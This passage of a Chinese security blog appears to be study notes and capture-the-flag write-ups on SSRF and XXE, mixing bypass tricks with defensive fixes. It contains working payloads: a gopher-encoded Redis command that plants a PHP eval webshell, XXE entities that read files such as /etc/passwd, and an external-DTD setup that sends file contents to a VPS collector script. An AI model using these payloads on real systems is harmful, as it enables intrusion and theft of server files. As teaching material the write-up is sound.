title="sftp:&#x2F;&#x2F;"></a>sftp:&#x2F;&#x2F;</h2><p>SSH文件传输协议或安全文件传输协议</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap:&#x2F;&#x2F;"></a>ldap:&#x2F;&#x2F;</h2><p>轻量级目录访问协议</p><h2 id="tftp"><a href="#tftp" class="headerlink" title="tftp:&#x2F;&#x2F;"></a>tftp:&#x2F;&#x2F;</h2><p>简单文件传输协议</p><h2 id="gopher-（常用）"><a href="#gopher-（常用）" class="headerlink" title="gopher:&#x2F;&#x2F; （常用）"></a>gopher:&#x2F;&#x2F; （常用）</h2><p>分布式文档传递服务，可使用gopherus生成payload（gopherus要使用python2）<br>有部分服务是http协议不支持通讯的，那么可以用gopher来进行通讯（如mysql，redis服务等）<br>应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：Gopherus</p><h1 id="SSRF绕过方式"><a href="#SSRF绕过方式" class="headerlink" title="SSRF绕过方式"></a>SSRF绕过方式</h1><p>情况1：限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</font></p><p>采用http基本身份认证的方式绕过，即@</font></p><p><a href="http://www.xxx.com@www.xxyy.com/">http://www.xxx.com@www.xxyy.com</a></font></p></font><p>情况2：限制请求IP不为内网地址</font></p><p>当不允许ip为内网地址时：</font></p><p>（1）采取短网址绕过</p><p>（2）采取域名解析</p><p>（3）采取进制转换</font></p><p>（4）采取3XX重定向</font></p><h1 id="白盒CTF-绕过-伪协议-审计点"><a href="#白盒CTF-绕过-伪协议-审计点" class="headerlink" title="白盒CTF-绕过&amp;伪协议&amp;审计点"></a>白盒CTF-绕过&amp;伪协议&amp;审计点</h1><h2 id="351-无过滤"><a href="#351-无过滤" class="headerlink" title="351-无过滤"></a>351-无过滤</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733732705456-8a2e9684-746a-46d6-b8cf-bfde84e44842.png"></p><p>分析：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">//报错不显示</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//高亮</span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];<span class="comment">//POST传参url</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);<span class="comment">//curl_init 初始化一个 cURL 会话，并设置目标 URL 为 $url</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);<span class="comment">//设置 cURL 选项，表示请求返回的数据中不包含头部信息。</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//设置 cURL 选项，表示将请求结果返回为字符串，而不是直接输出。</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">//执行 cURL 请求并将返回内容存储到 $result</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);<span class="comment">//关闭cUrl</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>没有任何过滤，直接尝试获取本地文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733733935041-e9a6ef90-dde4-4be7-bbf5-98f63c49f4d8.png"></p><h2 id="352-353-ip地址过滤（IP地址进制转换）"><a href="#352-353-ip地址过滤（IP地址进制转换）" class="headerlink" title="352-353-ip地址过滤（IP地址进制转换）"></a>352-353-ip地址过滤（IP地址进制转换）</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733734663161-e4bfb490-8aa7-4c45-872e-85768d8054c6.png"></p><p>要求地址中必须含有http或https，且不能含有localhost和127.0.0</p><p>绕过：</p><p>ip地址进制转换</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733734829549-047404f2-14b2-4976-a200-c7193dd75a7d.png"></p><p>十六进制和十进制都可以（十六进制前要加0x）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733734876905-9a2748a2-3e93-48f2-b6e8-b295603c5534.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733734903408-307ad7c1-b7c5-4c5b-b561-3d08f1436eac.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735079009-625e819b-f786-4128-9b16-6ac3540c6cd5.png"></p><p>还有一种特殊的省略模式</p><p>127.0.0.1写成127.1</p><p>用CIDR绕过localhost</p><p>url&#x3D;<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a></p><p>还有很多方式</p><p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p><p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p><h2 id="354-域名解析ip绕过"><a href="#354-域名解析ip绕过" class="headerlink" title="354-域名解析ip绕过"></a>354-域名解析ip绕过</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735574901-947b002f-a897-430f-a6e1-691e5523a514.png"></p><p>localhost 1 0 都被过滤</p><p>域名解析ip绕过</p><p>配置一个域名解析为127.0.0.1</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735704044-8cfca0cc-b7b0-4b10-918c-baf59cf84438.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//test.hhhan.club/flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735815220-b93fcd9d-bab2-40d0-bcb2-3662b817666d.png"></p><h2 id="355-356-长度限制IP绕过"><a href="#355-356-长度限制IP绕过" class="headerlink" title="355-356-长度限制IP绕过"></a>355-356-长度限制IP绕过</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735995217-2e6d0b19-1515-495b-9690-058237c86b0b.png"></p><p>对于输入的ip地址有长度限制，要&lt;&#x3D;5</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733736141096-d48b2fc4-7bd1-4f33-8a7f-c71a55cf79c7.png"></p><blockquote><p>356为长度&lt;&#x3D;3，payload：url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p></blockquote><h2 id="357-重定向解析绕过"><a href="#357-重定向解析绕过" class="headerlink" title="357-重定向解析绕过"></a>357-重定向解析绕过</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733736698143-f77efed2-1b39-41a0-8672-896d11ec1fb0.png"></p><p>如果输入的域名解析结果为127.0.0.1，就会被过滤</p><p>重定向绕过</p><p>在VPS下创建一个文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>); </span><br><span class="line">其作用是：当执行该脚本时，会直接跳转到对应的网址，即Location: 后面的网址。</span><br></pre></td></tr></table></figure><p>再去访问这个文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733737890099-6067ff6a-4702-4e2c-a81f-ccbced7480e2.png"></p><h2 id="358-匹配但不影响写法绕过"><a href="#358-匹配但不影响写法绕过" class="headerlink" title="358-匹配但不影响写法绕过"></a>358-匹配但不影响写法绕过</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733737999490-4c9598f7-570e-450a-b8cb-ceeb07a8f236.png"></p><p>url中必须包含http: &#x2F; ctf show 字样，url的内容才会被执行输出</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//ctf.@127.0.0.1/flag.php#show</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733738148952-e4e51a47-b786-4eb9-9c3c-ccefd0054343.png"></p><blockquote><p>#注释掉后面的内容</p><p>ctf.@对url没有影响</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733738449498-e95a42bf-1d34-4118-90b8-fc2bac68312b.png"></p></blockquote><h2 id="gopher协议打"><a href="#gopher协议打" class="headerlink" title="gopher协议打"></a>gopher协议打</h2><h3 id="359-mysql"><a href="#359-mysql" class="headerlink" title="359-mysql"></a>359-mysql</h3><p>前提条件是无密码的mysql</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733738642143-96ed85e3-8193-4c69-864b-f5c983ffcad0.png"></p><p>登录的数据包：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740084278-fc76ab9f-29ea-446b-b876-f8a6f6f6e329.png"></p><p>使用gopherus生成payload</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733739731500-5d88dd4d-0527-4331-9407-737e2e021471.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733739923803-c93b67d7-9e77-44a6-8b0b-a40ff211bce7.png"></p><p>将payload在进行一次url编码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740408774-0ef89d40-db61-4d29-ae90-81dc21b6ddce.png"></p><p>发送</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740431151-909a1e9b-76d3-4810-b1f6-54206fec5ce0.png"></p><p>访问x.php，木马被写入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740445491-ee4bbd84-a295-4c4a-b489-886f5da54d3b.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740496292-3145ea96-cc88-4bf8-951c-a29636f82bf9.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740521737-b63c59fd-0c00-4c7e-b34e-3c24b42bddc0.png"></p><h3 id="360-redis"><a href="#360-redis" class="headerlink" title="360-redis"></a>360-redis</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740561458-72722c90-b2cc-45b2-8d6d-e5e65d78890a.png"></p><p>使用gopherus</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740900865-b965f5f0-5b21-484c-b9ad-5f6dec7bb7d3.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741341457-c0e9a219-92e7-4818-b593-ce54390625c2.png"></p><p>生成的文件为当前目录下的shell.php</p><p>同样，gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_后面的内容也要进行url编码</p><p>payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post：url=gopher:<span class="comment">//127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252433%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527pass%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741295364-8ea79fad-d64a-4b67-a346-82bc52e89d41.png"></p><p>命令执行</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741399346-bd7517ed-7a51-4b39-b257-7c424e39d9b2.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741413398-e6d94eb9-fdac-4c3a-937b-fde0a4db3e5d.png"></p><h1 id="黑盒WEB-业务功能-URL关键字"><a href="#黑盒WEB-业务功能-URL关键字" class="headerlink" title="黑盒WEB-业务功能&amp;URL关键字"></a>黑盒WEB-业务功能&amp;URL关键字</h1><p>黑盒探针：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501763-f92fc712-30e4-4fd8-a4db-6060f7c89beb.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501958-3747910f-12b3-4fba-bc61-12ea7559496a.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501727-56dfa9a0-87f9-4131-a73f-0b36bc6ec375.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501970-9d035e46-9c70-427b-9226-6d8c10a0d97e.png"></p><p>SRC(文件导出&#x2F;格式转换 SSRF)</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501928-e6f5aacc-a8f3-41a0-8a35-1b04c59efd49.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502287-087ef846-85c1-49a1-8bfe-6308b3199bbd.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502337-9ae4caab-8313-4b6d-8a8d-9b7311c2f68e.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502625-4b9eb08f-1a50-476d-acf6-5c8ff35d93c2.png"></p><p>iframe 标签</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://6p5vvu.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;6p5vvu.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;iframe&gt;标签是干嘛的？</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502616-f81c6bd9-abcc-491d-ab8c-222771adbcc4.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502571-b84b0a8d-a7ec-4fff-be46-f9ea890262d2.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502785-3676884c-31fd-4fc2-bf31-369bf754dbca.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502989-369031a1-f5f1-470f-ba26-4c71fafa480c.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741503193-3b4a236c-fc36-4607-baae-f9ee17771e77.png"></p><p>SSRF和文件包含黑盒如何区分？</p><p>1.分析参数关键字(url字样大概率SSRF，file字样大概率文件包含)<br>2.看参数值地址(文件包含一般只允许包含本地，看能不能包含远程地址)<br>3.分析页面响应</p><p>多方面多角度分析</p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2025/05/27/XXE/"/>
      <url>/2025/05/27/XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。等同于JSON传输。</p><p>XXE漏洞XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取(最常用)、命令执行、内网扫描、攻击内网等危害。</p><p>php原生态代码只能造成文件读取，其他的例如命令执行那些都是跟一些第三方库导致的安全问题有关</p><p>XML 与 HTML 的主要差异：</p><blockquote><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p><p>HTML 旨在显示信息 ，而XML旨在传输存储信息。</p></blockquote><p>Example：网站的xml文件解析</p><p>客户端：使用json发送数据，服务端：使用json接收数据</p><p>客户端：使用xml发送数据，服务端：使用xml接收数据</p><p>xml如果发送恶意数据，造成XXE注入</p><h1 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h1><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><ol><li>获取得到Content-Type或数据类型为xml时，尝试xml语言payload进行测试</li><li>不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</li><li>XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</li></ol><p>获取得到Content-Type或数据类型为xml时，尝试xml语言payload进行测试</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a><font style="background-color:rgba(255, 255, 255, 0);">白盒</font></h2><ol><li>可通过应用功能追踪代码定位审计</li><li>可通过脚本特定函数搜索定位审计</li><li>可通过伪协议玩法绕过相关修复等</li></ol><h1 id="XXE修复防御方案"><a href="#XXE修复防御方案" class="headerlink" title="XXE修复防御方案"></a>XXE修复防御方案</h1><h2 id="方案1-禁用外部实体"><a href="#方案1-禁用外部实体" class="headerlink" title="方案1-禁用外部实体"></a><font style="background-color:rgba(255, 255, 255, 0);">方案1-禁用外部实体</font></h2><p><font style="background-color:rgba(255, 255, 255, 0);">PHP:</font></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p><font style="background-color:rgba(255, 255, 255, 0);">JAVA:</font></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><font style="background-color:rgba(255, 255, 255, 0);">Python：</font></p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(<span class="title">xmlSource</span>,<span class="title">etree</span>.<span class="type">XMLParser</span>(<span class="title">resolve_entities</span>=<span class="type">False</span>))</span><br></pre></td></tr></table></figure><h2 id="方案2-过滤用户提交的XML数据"><a href="#方案2-过滤用户提交的XML数据" class="headerlink" title="方案2-过滤用户提交的XML数据"></a><font style="background-color:rgba(255, 255, 255, 0);">方案2-过滤用户提交的XML数据</font></h2><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>发现是xml传递数据，且数据包有回显，将payload覆盖插入request请求体中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE xiaodi [</span><br><span class="line">&lt;!ENTITY test SYSTEM  <span class="string">&quot;file:///d:/1.txt&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将file:///d:/1.txt写入test，再赋值给test变量，通过xml传递数据，后端再解析xml内容时，test里的命令可以执行，xiaodi可以改，但test要一致</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733662388188-32b59f87-bc68-498a-96b1-48b7cd3d5a15.png"></p><h3 id="外部实体引用dtd"><a href="#外部实体引用dtd" class="headerlink" title="外部实体引用dtd"></a>外部实体引用dtd</h3><p>先创建一个dtd文件，payload里引用这个dtd文件，使dtd文件内容可以被执行</p><p>xxe.dtd：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY send SYSTEM <span class="string">&quot;file:///d:/1.txt&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM <span class="string">&quot;http://127.0.0.1:80/xxe.dtd&quot;</span>&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733662659941-374b9f1e-3104-4041-be59-945441922279.png"></p><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><p>无回显思路：</p><ol><li>带外测试是否存在xxe</li><li>无回显读文件(外部实体引用dtd)</li></ol><h3 id="带外测试"><a href="#带外测试" class="headerlink" title="带外测试"></a>带外测试</h3><p>将dnslog地址写入payload，让服务端解析xml时访问dnslog domain</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM <span class="string">&quot;http://9v57ll.dnslog.cn&quot;</span>&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733663258429-520964be-6847-4cb1-8300-656085deff56.png"></p><p>在dnslog平台查看结果，如果接收到，说明xml被解析，存在xxe漏洞</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733663289623-acd27a8b-2e91-4f6e-976d-f27bbbdcf7b8.png"></p><p>或者可以在VPS启用一个Web服务</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python -m http.server port</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733663331582-ca794c71-3abf-4fb3-b291-d3806cf9d7c7.png"></p><h3 id="无回显读文件-外部实体引用dtd"><a href="#无回显读文件-外部实体引用dtd" class="headerlink" title="无回显读文件(外部实体引用dtd)"></a>无回显读文件(外部实体引用dtd)</h3><p>引用外部实体dtd解析文件，文件内容为将执行结果写入另一个文件中</p><p>在VPS创建两个文件</p><p>xxe.dtd：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://127.0.0.1/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>get.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///d:/1.txt&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">&quot;http://127.0.0.1/xxe.dtd&quot;</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>xml传输到服务器，服务器解析执行1.txt中的内容，并引用VPS中的外部实体dtd文件，dtd中的内容是去访问VPS中的get.php，get.php中的内容则是将解析的1.txt的结果写入file.txt文件中，最后在服务器可以访问1.txt文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733663516662-ef3edd06-caf7-41ca-958e-d62fcb68154d.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733663516729-3753ef88-5756-4b75-82d0-377de3dd58e7.png"></p><p>当我们想要读取的1.txt文件中有空格时，我们可以使用可以用php伪协议来绕过</p><p>payload：</p><p>使用base64编码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">&quot;http://124.221.77.120/xxe.dtd&quot;</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733664220622-c2761610-06fe-4556-8290-6214902d8bae.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733664220583-2aac9d90-6c0e-4652-a10d-283f14eb4731.png"></p><p>获得的内容再去base64解码</p><h1 id="XML-XXE-黑盒-JSON-黑盒测试-类型修改"><a href="#XML-XXE-黑盒-JSON-黑盒测试-类型修改" class="headerlink" title="XML&amp;XXE-黑盒-JSON&amp;黑盒测试&amp;类型修改"></a>XML&amp;XXE-黑盒-JSON&amp;黑盒测试&amp;类型修改</h1><p>漏洞URL：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p><blockquote><p>信息搜集时发现改网站既有json传输数据，也有xml传输数据，尝试改为xml传递数据</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666487653-adc3940a-ff9a-46b1-b43c-264ac57c3729.png"></p><p>更改请求数据格式：Content-Type为xml格式</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666487623-861b1f4c-0d17-4a18-8217-5da7b0a00537.png"></p><h1 id="XML-XXE-白盒-CMS-PHPSHE-无回显"><a href="#XML-XXE-白盒-CMS-PHPSHE-无回显" class="headerlink" title="XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显"></a>XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显</h1><p>1、搜索漏洞函数simplexml_load_string</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666487612-f5f51bfb-dc07-428f-8f67-cc933d7a8a21.png"></p><p>2、pe_getxml函数调用了漏洞函数</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666487596-b5acfae9-8116-4937-ac43-0e4837559dd0.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666487631-5fbc7c43-fac2-4cb9-95a1-f5bfdc241620.png"></p><p>3、wechat_getxml调用了pe_getxml</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666488376-4fa48a4f-9660-43b5-8d66-8f399abc0e9c.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666488427-7d5eba54-c531-4bf0-afe6-c205d1fd564a.png"></p><p>4、notify_url.php调用了wechat_getxml</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666488378-fba0c263-cb7f-4c9f-9768-c12ff92ae71d.png"></p><p>5、访问notify_url文件触发wechat_getxml函数,构造Paylod测试</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666488375-f5088ecf-c688-426b-937c-9b36e8de9928.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666488552-18f1d786-fd7f-496a-9d9b-f461cf868f71.png"></p><p><img 